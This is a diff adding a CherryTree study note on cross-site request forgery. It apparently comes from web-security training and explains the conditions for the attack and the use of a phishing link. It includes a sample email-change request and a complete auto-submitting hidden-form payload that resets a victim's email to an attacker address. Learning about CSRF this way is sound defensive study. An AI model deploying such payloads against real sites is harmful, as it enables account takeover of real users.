@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="35" master_id="0" name="CSRF" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747561470" ts_lastsave="1747589633">
+    <rich_text>Taking over f.e. session and performing actions under user -&gt; change email/pw
+
+- relevant action
+- cookie based session hanling
+- no unpredictable req. parameters (we know / control all parameters req. to perform r. action)
+
+Easiest example: 
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Construct a web-page with a hidden form and js to auto perform action -&gt; send phishing link.
+h
+host it on web server when he clicks it he changes email.</rich_text>
+    <codebox char_offset="243" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">POST /email/change HTTP/1.1&#13;
+Host: vulnerable-website.com&#13;
+Content-Type: application/x-www-form-urlencoded&#13;
+Content-Length: 30&#13;
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE&#13;
+&#13;
+email=wiener@normal-user.com</codebox>
+    <codebox char_offset="340" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">&lt;html&gt;&#13;
+    &lt;body&gt;&#13;
+        &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;&#13;
+            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;&#13;
+        &lt;/form&gt;&#13;
+        &lt;script&gt;&#13;
+            document.forms[0].submit();&#13;
+        &lt;/script&gt;&#13;
+    &lt;/body&gt;&#13;
+&lt;/html&gt;</codebox>
+  </node>
+</cherrytree>
